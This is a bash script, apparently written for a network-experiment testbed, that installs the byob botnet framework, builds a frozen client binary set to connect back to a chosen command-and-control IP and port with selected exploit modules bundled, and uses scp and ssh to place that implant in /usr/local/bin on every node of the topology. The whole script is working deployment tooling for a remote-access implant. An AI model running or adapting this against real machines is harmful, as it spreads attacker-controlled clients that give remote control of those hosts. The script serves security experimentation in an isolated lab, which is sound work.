#!/bin/bash

set -e

server_ip=""
port=""
modules=""
location="/usr/local/bin"
help=false


show_help() {
    echo -e "Usage: ./install/byob.sh [flags] <C&C ip> <port> <modules>"
    echo -e ""
    echo -e "This command installs byob on the current xdc, builds a client binary, and uploads it to every node in the topology"
    echo -e "\tThis program WON'T run byob on the target machine, you need to do that"
    echo -e "\tYou can set the details of the client program via the cli. The output is a frozen binary, so there aren't any client side dependencies"
    echo -e ""
    echo -e "-h/--help shows this menu"
    echo -e "-l sets the location to install the client binary"
    echo -e "\tdefaults to /usr/local/bin/byob-client"
    echo -e ""
    echo -e "<xdc> is the xdc you'd like to install byob on"
    echo -e "<C&C ip> is the ip the compromised machines should connect to to reach your command and control server"
    echo -e "<port> is the open port on your C&C server"
    echo -e "<modules> are the exploits / libraries you'd like to bundle in your target's binary"
    echo -e ""
}


while [[ $# -gt 0 ]]; do
    case "$1" in
        -h | --help)
            help=true
            shift
            ;;
        -l)
            shift
            location="$1"
            shift
            ;;
        *)
            if [ "$server_ip" = "" ]; then
                server_ip="$1"
            elif [ "$port" = "" ]; then
                port="$1"
            else 
                modules="$@"
                while [[ $# -gt 1 ]]; do shift; done
            fi
            shift
            ;;
    esac
done


if [ "$server_ip" = "" ] || [ "$port" = "" ]; then
    echo "not enough arguments. requires c&c ip, and port"
    echo ""
    show_help
    exit 1
fi


if [ "$help" = "true" ]; then
    show_help
    shift
fi


remote_exec() {
    server="$1"
    shift
    ssh "$server" "$@"
}


install() {
    pushd .
    if [ ! -f ~/byob/byob/requirements.txt ]; then
            cd ~
            sudo apt -y update
            sudo apt -y install git gcc python3-dev build-essential
            sudo apt -y update --fix-missing
            git clone https://github.com/STEELISI/byob.git byob
    fi
    cd ~/byob/byob
    pip install -r ./requirements.txt
    popd
}


create_client() {
    server_ip="$1"
    shift
    port="$1"
    shift
    modules="$@"

    pushd .

    cd ~/byob/byob
    filename=$( \
            python3 ./client.py --freeze $server_ip $port $modules \
                | tail -2 \
                | sed 's#.*\/##' \
                | sed 's#)##'  \
    )

    popd 

    echo $filename
}



install

client_file=$(create_client $server_ip $port $modules)

nodes=$(./util/list-nodes.sh)

cd ~/byob/byob

for node in $nodes; do
    scp ./dist/$client_file $node:~/byob-client
    ssh $node "sudo mv ~/byob-client /usr/local/bin"
done


